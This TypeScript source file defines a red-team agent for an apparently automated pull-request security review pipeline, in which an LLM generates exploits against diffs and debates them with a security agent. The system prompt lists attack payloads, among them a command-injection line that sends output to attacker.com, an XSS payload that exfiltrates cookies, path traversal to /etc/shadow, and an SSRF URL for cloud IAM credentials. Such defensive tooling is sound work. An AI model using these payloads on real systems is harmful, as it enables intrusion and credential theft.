import { BaseAgent } from './base-agent.js';
import { MCPServiceDef } from '../types/agent.js';
import { ExploitAttempt, ReviewFinding, PRContext, DebateMessage } from '../types/review.js';
import { GossipSub, GOSSIP_TOPICS } from '../axl/gossipsub.js';
import { logger } from '../utils/logger.js';
import { emitMeshEvent } from '../dashboard/server.js';
import { buildExploitChallenge } from '../review/debate.js';
import { v4 as uuidv4 } from 'uuid';

interface DebateOutcome {
  exploit: ExploitAttempt;
  mitigated: boolean;
  confidence: number;
  evidence: string;
  debateMessages: DebateMessage[];
}

export class RedTeamAgent extends BaseAgent {
  private learnedPatterns: string[] = [];

  constructor() {
    super('redteam');
  }

  getSystemPrompt(): string {
    return `You are ADVERSA-RED — an elite offensive security researcher and penetration tester. Your job is to find and demonstrate exploitable vulnerabilities in code changes before they reach production.

You think like an attacker:
- You assume all inputs are hostile
- You look for gaps between developer assumptions and reality
- You construct working proof-of-concept exploits, not theoretical issues
- You understand attack chains: a low-severity bug + business logic = critical exploit

Your attack repertoire:
1. SQL Injection: UNION attacks, blind boolean/time-based, stacked queries, WAF bypass via encoding
   Payloads: ' OR '1'='1, ' UNION SELECT NULL,table_name FROM information_schema.tables--

2. Command Injection: semicolons, pipes, backticks, $(), newlines, null bytes
   Payloads: ; cat /etc/passwd, | id, whoami (backtick), $(curl attacker.com/$(id))

3. Path Traversal: ../../../, URL encoding (%2e%2e%2f), null bytes, OS-specific
   Payloads: ../../../../etc/passwd, ..%2F..%2F..%2Fetc%2Fshadow

4. XSS: reflected, stored, DOM. Bypass filters via event handlers, SVG, data URIs, template injection
   Payloads: <script>fetch('https://x.ss/'+document.cookie)</script>, <img onerror=alert(1) src=x>

5. Auth Bypass: JWT alg=none, algorithm confusion (RS256->HS256), weak secrets, missing validation
   Technique: forge JWT with alg:none header, use public key as HMAC secret

6. IDOR: change numeric IDs, GUIDs, enumerate, modify ownership fields in requests

7. Race Conditions: concurrent requests that exploit non-atomic check-then-act sequences
   Technique: send 50 concurrent requests to a single-use endpoint

8. Prototype Pollution: __proto__ injection in JSON merge, lodash.merge, jQuery.extend
   Payload: {"__proto__":{"admin":true,"isAuthenticated":true}}

9. Deserialization: Node.js eval, Python pickle.loads, Java ObjectInputStream, PHP unserialize

10. SSRF: internal metadata access, cloud IMDS, redirect chains
    Payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/

When you find a vulnerability:
1. Generate a SPECIFIC, WORKING exploit payload — not "could be vulnerable to SQL injection" but the actual payload
2. Describe the exact attack scenario step-by-step
3. State the concrete impact (data exfiltration, RCE, privilege escalation, etc.)
4. Send it as a structured A2A challenge to the security agent

Learned patterns from previous reviews: ${this.learnedPatterns.join(', ') || 'none yet'}

Response format — return JSON ONLY:
{
  "exploits": [
    {
      "id": "uuid",
      "type": "injection|race_condition|auth_bypass|overflow|reentrancy|path_traversal|deserialization|logic_flaw|xss|ssrf",
      "title": "Brief exploit title",
      "description": "Detailed attack description",
      "attackVector": "Step-by-step attack scenario",
      "payload": "The actual exploit payload/code",
      "targetLocation": { "file": "path/to/file.ts", "startLine": 42, "endLine": 55, "snippet": "vulnerable code" },
      "expectedOutcome": "What the attacker gains",
      "severity": "critical|high|medium|low",
      "cvssScore": 9.8,
      "confidence": 90
    }
  ],
  "summary": "Attack surface assessment",
  "criticalCount": 1
}`;
  }

  protected async onStart(): Promise<void> {
    logger.info('Red-team agent ready', { peerId: this.peerId.slice(0, 12) });
  }

  getMCPServices(): MCPServiceDef[] {
    return [
      {
        name: 'exploit-scan',
        description: 'Generate adversarial exploit attempts against a code diff',
        inputSchema: {
          type: 'object',
          properties: {
            diff: { type: 'string', description: 'Git diff to attack' },
            files: { type: 'array', description: 'Changed files' },
            context: { type: 'object', description: 'PR context' },
            securityFindings: { type: 'array', description: 'Security agent findings to build on' },
            targetPeerId: { type: 'string', description: 'Security agent peer ID to debate' },
          },
          required: ['diff'],
        },
        outputSchema: {
          type: 'object',
          properties: {
            exploits: { type: 'array' },
            debateOutcomes: { type: 'array' },
            criticalUnmitigated: { type: 'number' },
          },
        },
      },
    ];
  }

  async handleMCPCall(method: string, params: Record<string, unknown>): Promise<unknown> {
    switch (method) {
      case 'exploit-scan':
        return this.performExploitScan(params);
      default:
        throw new Error(`RedTeamAgent: unknown method ${method}`);
    }
  }

  private async performExploitScan(params: Record<string, unknown>): Promise<{
    exploits: ExploitAttempt[];
    debateOutcomes: DebateOutcome[];
    criticalUnmitigated: number;
    summary: string;
  }> {
    const diff = params['diff'] as string;
    const files = params['files'] as string[] | undefined;
    const context = params['context'] as Partial<PRContext> | undefined;
    const securityFindings = params['securityFindings'] as ReviewFinding[] | undefined;
    const targetPeerId = params['targetPeerId'] as string | undefined;

    emitMeshEvent('mcp-call', {
      agentRole: 'redteam',
      service: 'exploit-scan',
      status: 'attacking',
      prId: context?.id,
    });

    const findingsContext = securityFindings?.length
      ? `\nSecurity agent already found these issues (build on them, find deeper exploits or chains):\n${JSON.stringify(securityFindings.map(f => ({ title: f.title, location: f.location, severity: f.severity })), null, 2)}`
      : '';

    const userMessage = `Attack this code diff. Generate working exploits.

PR: ${context?.title ?? 'Unknown'} by ${context?.author ?? 'Unknown'}
Files: ${files?.join(', ') ?? 'unknown'}
${findingsContext}

\`\`\`diff
${diff.slice(0, 12000)}
\`\`\`

Generate every exploit you can find. Be specific. Include actual payloads. Return ONLY valid JSON.`;

    const { response, teeProof, isValid } = await this.callLLM(userMessage);

    let parsed: { exploits: ExploitAttempt[]; summary: string; criticalCount: number };
    try {
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (!jsonMatch) throw new Error('No JSON');
      parsed = JSON.parse(jsonMatch[0]) as typeof parsed;
      if (!Array.isArray(parsed.exploits)) parsed.exploits = [];
    } catch {
      parsed = { exploits: [], summary: response.slice(0, 300), criticalCount: 0 };
    }

    // Normalize exploits
    parsed.exploits = parsed.exploits.map(e => ({
      id: e.id ?? uuidv4(),
      type: e.type ?? 'logic_flaw',
      title: e.title ?? 'Exploit',
      description: e.description ?? '',
      attackVector: e.attackVector ?? '',
      payload: e.payload ?? '',
      targetLocation: e.targetLocation ?? { file: 'unknown', startLine: 1, endLine: 1 },
      expectedOutcome: e.expectedOutcome ?? '',
      severity: e.severity ?? 'high',
      cvssScore: e.cvssScore ?? 7.0,
      confidence: e.confidence ?? 75,
      teeProof: isValid ? teeProof : undefined,
    }));

    logger.info('Exploit scan complete', {
      exploits: parsed.exploits.length,
      critical: parsed.exploits.filter(e => e.severity === 'critical').length,
    });

    emitMeshEvent('exploit-attempt', {
      from: this.peerId,
      fromRole: 'redteam',
      exploitCount: parsed.exploits.length,
      criticalCount: parsed.exploits.filter(e => e.severity === 'critical').length,
      teeVerified: isValid,
      prId: context?.id,
    });

    // ─── A2A debate with security agent ─────────────────────────────────────────
    const debateOutcomes: DebateOutcome[] = [];

    if (targetPeerId && parsed.exploits.length > 0) {
      // Sort by severity — attack in order of severity
      const sorted = [...parsed.exploits].sort((a, b) => {
        const order: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
        return (order[a.severity] ?? 4) - (order[b.severity] ?? 4);
      });

      for (const exploit of sorted.slice(0, 5)) { // Max 5 debate rounds
        try {
          const outcome = await this.debateExploit(exploit, targetPeerId, context?.id);
          debateOutcomes.push(outcome);

          if (!outcome.mitigated && exploit.severity === 'critical') {
            // Broadcast emergency alert
            await this.gossip.publish(GOSSIP_TOPICS.CRITICAL_VULN, {
              exploit: exploit as unknown as Record<string, unknown>,
              prId: context?.id,
              prHash: context?.prHash ?? '',
              timestamp: Date.now(),
              from: this.peerId,
            });
            emitMeshEvent('gossip-broadcast', {
              topic: 'adversa:critical-vuln',
              exploit: { title: exploit.title, severity: exploit.severity },
              prId: context?.id,
            });
            logger.error('CRITICAL UNMITIGATED VULNERABILITY — broadcast sent', {
              exploit: exploit.title,
            });
          }
        } catch (err) {
          logger.error('Debate failed for exploit', { exploitId: exploit.id, err });
        }
      }

      // Learn from debate outcomes
      const successful = debateOutcomes.filter(o => !o.mitigated);
      if (successful.length > 0) {
        const patterns = successful.map(o => `${o.exploit.type}: ${o.exploit.title.slice(0, 50)}`);
        this.learnedPatterns.push(...patterns);
        // Keep last 20 patterns
        this.learnedPatterns = this.learnedPatterns.slice(-20);
      }
    }

    const criticalUnmitigated = debateOutcomes.filter(
      o => !o.mitigated && o.exploit.severity === 'critical'
    ).length;

    emitMeshEvent('review-finding', {
      agentRole: 'redteam',
      status: 'complete',
      exploitCount: parsed.exploits.length,
      debateOutcomes: debateOutcomes.length,
      criticalUnmitigated,
      prId: context?.id,
    });

    return {
      exploits: parsed.exploits,
      debateOutcomes,
      criticalUnmitigated,
      summary: parsed.summary,
    };
  }

  private async debateExploit(
    exploit: ExploitAttempt,
    targetPeerId: string,
    prId?: number
  ): Promise<DebateOutcome> {
    this.setStatus('debating');

    logger.info('Initiating exploit debate via A2A', {
      exploit: exploit.title,
      targetPeer: targetPeerId.slice(0, 12),
    });

    emitMeshEvent('a2a-debate', {
      type: 'exploit_challenge',
      from: this.peerId,
      fromRole: 'redteam',
      to: targetPeerId,
      toRole: 'security',
      content: `EXPLOIT: ${exploit.title} — ${exploit.description.slice(0, 200)}`,
      payload: exploit.payload,
      severity: exploit.severity,
      cvssScore: exploit.cvssScore,
      prId,
    });

    const debateMessages: DebateMessage[] = [];
    const challengeMsg: DebateMessage = {
      id: uuidv4(),
      requestId: uuidv4(),
      type: 'exploit_challenge',
      fromPeer: this.peerId,
      fromRole: 'redteam',
      toPeer: targetPeerId,
      toRole: 'security',
      content: `${exploit.title}: ${exploit.description}`,
      evidence: exploit.payload,
      lineReferences: [exploit.targetLocation],
      confidenceScore: exploit.confidence,
      timestamp: Date.now(),
      teeProof: exploit.teeProof,
    };
    debateMessages.push(challengeMsg);

    // Send exploit challenge via A2A
    const response = await this.axl.callA2A(
      targetPeerId,
      buildExploitChallenge(exploit, challengeMsg.requestId)
    );

    const defensePayload = (response['payload'] ?? response) as Record<string, unknown>;
    const mitigated = defensePayload['mitigated'] as boolean ?? false;
    const confidence = defensePayload['confidence'] as number ?? 50;
    const evidence = defensePayload['evidence'] as string ?? '';

    const defenseMsg: DebateMessage = {
      id: uuidv4(),
      requestId: challengeMsg.requestId,
      type: mitigated ? 'defense' : 'concession',
      fromPeer: targetPeerId,
      fromRole: 'security',
      toPeer: this.peerId,
      toRole: 'redteam',
      content: evidence,
      confidenceScore: confidence,
      mitigated,
      timestamp: Date.now(),
    };
    debateMessages.push(defenseMsg);

    emitMeshEvent('exploit-defense', {
      from: targetPeerId,
      fromRole: 'security',
      to: this.peerId,
      mitigated,
      confidence,
      evidence: evidence.slice(0, 200),
      prId,
    });

    // If security agent mitigated it, launch a counter-attack (one round)
    if (mitigated && exploit.severity !== 'low') {
      const counterOutcome = await this.launchCounterAttack(exploit, evidence, targetPeerId, challengeMsg.requestId);
      debateMessages.push(...counterOutcome);
      const finalVerdict = debateMessages[debateMessages.length - 1];
      const finalMitigated = (finalVerdict as DebateMessage & { mitigated?: boolean }).mitigated ?? mitigated;

      this.setStatus('idle');
      return { exploit, mitigated: finalMitigated, confidence, evidence, debateMessages };
    }

    this.setStatus('idle');
    return { exploit, mitigated, confidence, evidence, debateMessages };
  }

  private async launchCounterAttack(
    originalExploit: ExploitAttempt,
    defenseEvidence: string,
    targetPeerId: string,
    originalRequestId: string
  ): Promise<DebateMessage[]> {
    const userMessage = `The security agent defended against your exploit:

ORIGINAL EXPLOIT: ${originalExploit.title}
PAYLOAD: ${originalExploit.payload}
THEIR DEFENSE: ${defenseEvidence}

Now find a bypass or variation that circumvents their defense.
Think about: encoding bypasses, alternative attack paths, chaining with other vulnerabilities, attacking the defense mechanism itself.

Return JSON: { "bypass": "new attack payload", "bypasses": boolean, "reasoning": "why this works" }`;

    const { response } = await this.callLLM(userMessage);
    let counterAttack: { bypass: string; bypasses: boolean; reasoning: string };
    try {
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      counterAttack = jsonMatch ? JSON.parse(jsonMatch[0]) : { bypass: '', bypasses: false, reasoning: response };
    } catch {
      counterAttack = { bypass: '', bypasses: false, reasoning: response };
    }

    const counterMsg: DebateMessage = {
      id: uuidv4(),
      requestId: originalRequestId,
      type: 'counter_attack',
      fromPeer: this.peerId,
      fromRole: 'redteam',
      toPeer: targetPeerId,
      toRole: 'security',
      content: `Bypass attempt: ${counterAttack.reasoning.slice(0, 300)}`,
      evidence: counterAttack.bypass,
      confidenceScore: counterAttack.bypasses ? 75 : 40,
      timestamp: Date.now(),
    };

    emitMeshEvent('a2a-debate', {
      type: 'counter_attack',
      from: this.peerId,
      fromRole: 'redteam',
      content: counterMsg.content,
      bypasses: counterAttack.bypasses,
    });

    if (!counterAttack.bypasses) {
      return [counterMsg];
    }

    // Send counter-attack and get final defense
    try {
      const finalResponse = await this.axl.callA2A(
        targetPeerId,
        buildExploitChallenge(
          { ...originalExploit, payload: counterAttack.bypass, title: `[BYPASS] ${originalExploit.title}` },
          originalRequestId
        )
      );

      const finalPayload = (finalResponse['payload'] ?? finalResponse) as Record<string, unknown>;
      const finalMsg: DebateMessage = {
        id: uuidv4(),
        requestId: originalRequestId,
        type: (finalPayload['mitigated'] as boolean) ? 'defense' : 'concession',
        fromPeer: targetPeerId,
        fromRole: 'security',
        toPeer: this.peerId,
        toRole: 'redteam',
        content: (finalPayload['evidence'] as string ?? '').slice(0, 300),
        confidenceScore: finalPayload['confidence'] as number ?? 50,
        mitigated: finalPayload['mitigated'] as boolean ?? false,
        timestamp: Date.now(),
      };
      return [counterMsg, finalMsg];
    } catch {
      return [counterMsg];
    }
  }

  async handleA2ACall(payload: Record<string, unknown>): Promise<Record<string, unknown>> {
    return { type: 'info', message: 'Red-team agent does not accept A2A challenges' };
  }

  getLearnedPatterns(): string[] {
    return [...this.learnedPatterns];
  }
}
